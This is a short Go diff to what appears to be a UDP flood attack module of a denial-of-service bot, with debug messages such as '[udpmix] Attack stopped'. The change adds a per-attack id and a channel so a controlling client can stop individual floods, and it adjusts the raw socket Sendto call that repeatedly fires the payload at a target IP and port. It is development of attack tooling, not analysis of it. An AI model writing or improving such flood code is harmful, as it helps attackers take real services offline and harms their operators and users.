@@ -12,7 +12,7 @@ import (
 	"time"
 )
 
-func UdpMethod(ctx context.Context, ipaddr string, _port string) {
+func UdpMethod(ctx context.Context, ipaddr string, _port string, id int, ch chan int) {
 	defer Catch()
 
 	if config.DEBUG {
@@ -34,6 +34,14 @@ func UdpMethod(ctx context.Context, ipaddr string, _port string) {
 				fmt.Println("[udpmix] Attack stopped")
 			}
 			return
+		case sid := <-ch:
+			if id == sid {
+				if config.DEBUG {
+					fmt.Println("[udpmix] Attack stopped (by client)")
+				}
+				close(ch)
+				return
+			}
 		case <-utils.StopChan:
 			if config.DEBUG {
 				fmt.Println("[udpmix] Cpu balancer")
@@ -74,7 +82,7 @@ func udp(ip net.IP, port int, payload []byte) {
 	}
 
 	for i := 0; i <= 20; i++ {
-		syscall.Sendto(fd, payload, 0, &addr)
+		syscall.Sendto(fd, payload, syscall.MSG_NOSIGNAL, &addr)
 		time.Sleep(10 * time.Millisecond)
 	}
 
